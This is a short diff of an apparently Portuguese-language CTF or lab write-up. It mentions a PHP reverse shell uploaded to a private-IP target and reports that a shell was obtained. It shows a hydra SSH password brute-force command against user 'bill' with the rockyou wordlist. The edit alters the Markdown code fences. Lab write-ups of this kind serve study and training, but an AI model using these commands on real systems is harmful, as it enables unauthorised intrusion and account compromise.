@@ -69,9 +69,9 @@ http://10.64.131.169:3333/internal/uploads/php-reverse-shell.phtml
 **Resultado:** conexão reversa recebida no listener, obtendo shell no
 sistema alvo.
 
-\`\`\`bash
+\`\`\bash
 hydra -l bill -P /usr/share/wordlists/rockyou.txt 10.64.131.169 ssh
-\`\`\`
+\`\`\
 
 **Equivalente em Medusa** (ferramenta foco original do desafio):
 \`\`\`bash
